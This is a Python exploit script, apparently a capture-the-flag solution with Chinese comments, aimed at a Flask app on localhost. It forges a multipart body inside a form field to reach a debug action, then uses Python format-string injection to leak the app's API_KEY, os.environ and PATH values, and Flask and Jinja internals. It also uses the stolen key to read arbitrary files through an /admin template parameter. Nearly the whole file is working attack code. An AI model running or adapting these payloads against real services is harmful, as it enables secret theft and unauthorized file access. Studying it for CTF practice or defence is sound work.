import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except:
        return "", 0

def debug_format(payload):
    """通过 format string 读取属性（不调用函数）"""
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        print(f"[-] Payload too long: {len(text)}")
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except:
        return None

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 利用 format string 读取 os 模块的属性（不调用函数）
    print("\n[*] Reading os module attributes...")
    
    # os.curdir
    result = debug_format("{0.view_functions[action].__globals__[os].curdir}")
    print(f"os.curdir: {result}")
    
    # os.sep
    result = debug_format("{0.view_functions[action].__globals__[os].sep}")
    print(f"os.sep: {result}")
    
    # os.environ 是一个字典对象
    print("\n[*] Reading os.environ (dict)...")
    result = debug_format("{0.view_functions[action].__globals__[os].environ}")
    print(f"os.environ type: {result[:200] if result else 'None'}...")
    
    # 尝试读取 PATH
    result = debug_format("{0.view_functions[action].__globals__[os].environ[PATH]}")
    print(f"PATH: {result}")
    
    # 读取 httpx 模块的信息
    print("\n[*] Reading httpx module...")
    result = debug_format("{0.view_functions[action].__globals__[httpx].__file__}")
    print(f"httpx.__file__: {result}")
    
    # 尝试访问 app.static_folder 等 Flask 属性
    print("\n[*] Reading Flask app attributes...")
    result = debug_format("{0.static_folder}")
    print(f"app.static_folder: {result}")
    
    result = debug_format("{0.template_folder}")
    print(f"app.template_folder: {result}")
    
    result = debug_format("{0.root_path}")
    print(f"app.root_path: {result}")
    
    # 检查 Jinja 环境
    print("\n[*] Reading Jinja environment...")
    result = debug_format("{0.jinja_env}")
    print(f"app.jinja_env: {result}")
    
    result = debug_format("{0.jinja_env.loader}")
    print(f"jinja_env.loader: {result}")
